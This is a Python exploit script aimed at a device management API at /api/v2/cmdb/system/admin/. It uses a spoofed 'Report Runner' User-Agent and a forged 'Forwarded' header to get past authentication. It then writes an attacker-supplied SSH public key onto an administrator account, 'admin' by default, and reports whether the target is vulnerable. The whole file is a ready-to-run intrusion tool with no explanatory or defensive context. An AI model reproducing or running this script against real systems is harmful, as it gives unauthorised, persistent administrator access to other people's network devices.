#!/usr/bin/python3
import argparse
import requests
import urllib3

requests.packages.urllib3.disable_warnings()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def format_key(key_file):
    with open(key_file) as f:
        k = f.read().strip()
    return k


def add_key(target, rserver, rport, username, key_file):
    key = format_key(key_file)
    j = {
        "ssh-public-key1": '\"' + key + '\"'
    }
    url = f'https://{target}/api/v2/cmdb/system/admin/{username}'
    header = {
        'User-Agent': 'Report Runner',
        'Forwarded': 'for=\"[' + rserver + ']:' + rport + '\";by=\"[' + rserver + ']:9888"'
    }
    r = requests.put(url, headers=header, json=j, verify=False)
    if 'SSH key is good' not in r.text:
        print(f'[-] {target} is not vulnerable!')
    else:
        print(f'[+] SSH key for {username} added successfully!')


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
    parser.add_argument('-r', '--rproxy', help='The reverse proxy server', required=False)
    parser.add_argument('-p', '--rport', help='The reverse proxy port', required=False)
    parser.add_argument('-u', '--username', help='The user to add an SSH key file for', required=False)
    parser.add_argument('-k', '--key-file', help='The SSH key file', required=False)
    args = parser.parse_args()
    # checking for the default params
    reverse_server = args.rproxy
    if reverse_server is None:
        reverse_server = "127.0.0.1"
    # ---------------------------------
    reverse_port = args.rport
    if reverse_port is None:
        reverse_port = "8888"
    # ---------------------------------
    key_pub = args.key_file
    if key_pub is None:
        key_pub = "~/.ssh/id_rsa.pub"
    # ---------------------------------
    user_name = args.username
    if user_name is None:
        user_name = "admin"
    add_key(args.target, reverse_server, reverse_port, user_name, key_pub)
